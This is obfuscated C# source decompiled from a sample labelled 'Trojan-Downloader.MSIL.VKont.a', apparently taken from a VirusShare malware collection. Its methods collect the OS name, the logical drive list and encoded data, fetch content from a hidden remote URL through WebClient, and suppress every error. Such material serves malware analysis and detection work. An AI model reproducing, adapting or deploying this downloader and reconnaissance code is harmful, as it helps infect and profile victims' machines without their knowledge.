// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7761CAE9-D290-48D9-A44C-5C95C5289DD6
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00008-msil\Trojan-Downloader.MSIL.VKont.a-ac18de4ecbb2a2d67066c2f262ee8f7a9d6a141b044780d493a970e6f8760975.exe

using \u0003;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Net;
using System.Text;
using System.Windows.Forms;

namespace \u0005
{
  internal sealed class \u0002
  {
    [NonSerialized]
    internal static \u0001.\u0001 \u0001;

    public static void \u0002()
    {
      try
      {
        byte[] numArray = \u0004.\u0002(\u0004.\u0001.\u0001);
        TextBox textBox1 = \u0002.\u0002.\u0002().\u0002().\u0002();
        textBox1.Text = textBox1.Text + \u0005.\u0002.\u0001(5577) + \u0002.\u0002.\u0002().Info.OSFullName + \u0005.\u0002.\u0001(5594);
        TextBox textBox2 = \u0002.\u0002.\u0002().\u0002().\u0002();
        textBox2.Text = textBox2.Text + \u0005.\u0002.\u0001(1048) + \u0004.\u0002(numArray) + \u0005.\u0002.\u0001(2961);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void \u0003()
    {
      try
      {
        WebClient webClient = new WebClient();
        \u0002.\u0002.\u0002().\u0002().\u0004().Text = \u0002.\u0002.\u0002().\u0002().\u0004().Text + \u0005.\u0002.\u0001(5611) + Encoding.ASCII.GetString(webClient.DownloadData(\u0005.\u0002.\u0001(5628)));
        webClient.Dispose();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void \u0004()
    {
      try
      {
        \u0002.\u0002.\u0002().\u0002().\u0004().Text += \u0005.\u0002.\u0001(5693);
        int num = checked (Environment.GetLogicalDrives().Length - 1);
        int index = 0;
        while (index <= num)
        {
          \u0002.\u0002.\u0002().\u0002().\u0004().Text += Environment.GetLogicalDrives()[index];
          \u0002.\u0002.\u0002().\u0002().\u0004().Text += \u0005.\u0002.\u0001(5714);
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    static \u0002() => \u0001.\u0002.\u0002();
  }
}
